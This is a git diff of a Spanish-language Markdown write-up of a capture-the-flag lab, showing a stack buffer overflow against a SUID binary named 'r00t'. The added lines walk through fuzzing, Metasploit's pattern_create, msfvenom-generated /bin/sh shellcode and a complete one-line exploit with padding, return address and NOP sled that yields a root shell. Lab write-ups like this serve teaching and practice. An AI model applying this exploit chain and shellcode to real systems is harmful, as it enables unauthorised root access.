@@ -87,9 +87,10 @@ echo '*<contenido de nuestro fichero con la clave pública>*' > /home/noob/.ssh/
 <img width="847" height="448" alt="image" src="https://github.com/user-attachments/assets/7a517b78-ee84-4d17-9281-f53e3a88dc5c" />
 
 - Seguramente donde pone que no hay nada ... es donde está. Veo que hay una carpeta con 'tres puertas'. Y que cada una de ellas tiene el mismo fichero aunque en una de ellas el tamaño es claramente diferente. Así que esa será la puerta que elegiré.
-<img width="550" height="308" alt="image" src="https://github.com/user-attachments/assets/47039a7e-28f5-4823-88dc-dce535f19cf2" />
+<img width="550" height="308" alt="image" src="https://github.com/user-attachments/assets/47039a7e-28f5-4823-88dc-dce535f19cf2" />  
 
-**Nota**: Las puertas cambian periódicamente. Incluso con la sesión abierta. Y si ejecutas uno de los *r00t* que no es el correcto, se bloquea el comando **ls** durante dos minutos. 
+**Nota**: Las puertas cambian periódicamente. Incluso con la sesión abierta. Y si ejecutas uno de los *r00t* que no es el correcto, se bloquea el comando **ls** durante dos minutos.  
+
 <img width="615" height="73" alt="image" src="https://github.com/user-attachments/assets/5483e5d6-3775-4fb1-a2ae-64fb024841da" />  
 
 También puede ser que te eche directamente de la sesión:  
@@ -108,14 +109,17 @@ Si selecciono la puerta correcta, veo que me dice que es necesario proporcionar 
 for i in {1..1000..50}; do printf "\nIntentando: %d\n" "$i"; ./door2/r00t "$(python -c "print('A'*$i)")"; done;
 ```
 - Y veo que falla cuando llego a las 300.
-<img width="887" height="386" alt="image" src="https://github.com/user-attachments/assets/4f00cae9-df84-4a14-8df1-465bb80310d6" />
+<img width="887" height="386" alt="image" src="https://github.com/user-attachments/assets/4f00cae9-df84-4a14-8df1-465bb80310d6" />  
 
-- Podría simplemente lanzar *r00t* desde el depuerador con 300 A's. Pero entonces no sé donde ha quedao los punteros.
-<img width="786" height="135" alt="image" src="https://github.com/user-attachments/assets/0c863fb1-092b-4a29-909d-9c6851ca1a6f" /> 
+- Podría simplemente lanzar *r00t* desde el depuerador con 300 A's. Pero entonces no sé donde ha quedao los punteros.  
+<img width="786" height="135" alt="image" src="https://github.com/user-attachments/assets/0c863fb1-092b-4a29-909d-9c6851ca1a6f" />
+
 - Así que uso un script que viene con Metasploit que me permite generar algo más fácil de buscar.
+  
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
 ```
+
 <img width="886" height="92" alt="image" src="https://github.com/user-attachments/assets/d559f53f-c9be-4ef4-b041-afa3b6329e06" />
 
 - Y de vuelta en la máquina atacada lo paso como parámetro.
@@ -131,25 +135,39 @@ for i in {1..1000..50}; do printf "\nIntentando: %d\n" "$i"; ./door2/r00t "$(pyt
 - Si muestro las variables de entorno, veo que hay bastantes. Esto puede afectarme a los punteros. 
 <img width="646" height="337" alt="image" src="https://github.com/user-attachments/assets/5c412622-f829-4b9d-b0d1-ddbcae5602f3" />
 
-- Así que repito la operación y me aseguro de que no hay ninguna variable.
+- Así que repito la operación y me aseguro de que no hay ninguna variable.  
 <img width="749" height="113" alt="image" src="https://github.com/user-attachments/assets/f629b2e7-fe50-4692-841a-c25587b8c066" />
 
-- Compruebo los registros. Nos interesa *esp* (Extended Stack Pointer).
-<img width="853" height="376" alt="image" src="https://github.com/user-attachments/assets/e5505a8a-7c6b-4cd9-bc82-48eaab184e25" />
+**Nota**. Parece que afecta si lanzo el *debugger* desde en el directorio en el que se encuentra la aplicación (gdb ./r00t) o utilizo un path (gdb ./door3/r00t).
 
-- Utilizo otra herramienta de Metasploit para que me genere el *payload* que añadiremos a esos 268+4 caracteres. Le pido que evite los caracteres \x00, \x0a y \x0d que podrían hacer que fallara el ataque.
+- Paso la misma cadena de entrada pero con 16 \x90 (NOP's) y 100 C's donde irá más tarde la *payload*. Compruebo los registros. Nos interesa *esp* (Extended Stack Pointer).  
+<img width="870" height="394" alt="image" src="https://github.com/user-attachments/assets/79abdfa5-8158-4182-b610-7944d753e0ca" />
+
+- Utilizo otra herramienta de Metasploit para que me genere el *payload* que añadiremos a esos 268+4+16 caracteres. Le pido que evite los caracteres \x00, \x0a y \x0d que podrían hacer que fallara el ataque.
 ```bash
 msfvenom -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d'
 ```
 <img width="727" height="282" alt="image" src="https://github.com/user-attachments/assets/9a9760d7-0836-4b22-97d2-e50f93ca39ae" />
 
-- Paso el Python que me ha generado al intérprete para tener toda la cadena en una línea. Además le pasaremos una secuencia de 16 \x90 (código NOP) y la dirección de ejecucíón (donde antes estaban las B's) en formato *least significant first*.
+- Concateno toda la cadena del código Python que me ha generado en una línea. Además le paso las 268 A's de relleno, la dirección de ejecucíón (donde antes estaban las B's) en formato *least significant byte first* y una secuencia de 16 \x90 (código NOP).
 
-<img width="874" height="264" alt="image" src="https://github.com/user-attachments/assets/fbc14a6e-b324-4475-956a-e34043790da0" />  
+```bash
+env - ./r00t $(python -c 'print "A" * 268 + "\x80\xfc\xff\xbf" + "\x90" * 16 + "\xb8\xc7\x3a\x4a\x85\xd9\xce\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0b\x31\x42\x15\x83\xea\xfc\x03\x42\x11\xe2\x32\x50\x41\xdd\x25\xf7\x33\xb5\x78\x9b\x32\xa2\xea\x74\x36\x45\xea\xe2\x97\xf7\x83\x9c\x6e\x14\x01\x89\x79\xdb\xa5\x49\x55\xb9\xcc\x27\x86\x4e\x66\xb8\x8f\xe3\xff\x59\xe2\x84"')
+```
+
+- Si lo ejecuto obtengo un shell en el que soy root.
+
+<img width="867" height="126" alt="image" src="https://github.com/user-attachments/assets/d4f1ed42-3fd3-496d-966e-f71295a49d7d" />
+
+- Ahora solo tengo que buscar el fichero donde está el token. Como *bonus* tengo los scripts que alteran las puertas y alguna cosa más.
+<img width="710" height="355" alt="image" src="https://github.com/user-attachments/assets/441b2583-2214-4201-ba63-4ab1f3122558" />
+
+- Saco el token y prueba finalizada.  
+<img width="449" height="93" alt="image" src="https://github.com/user-attachments/assets/c6be60d0-62f7-4116-8b68-75866ad7fc00" />
 
 
 
-- 
+
 
 
 
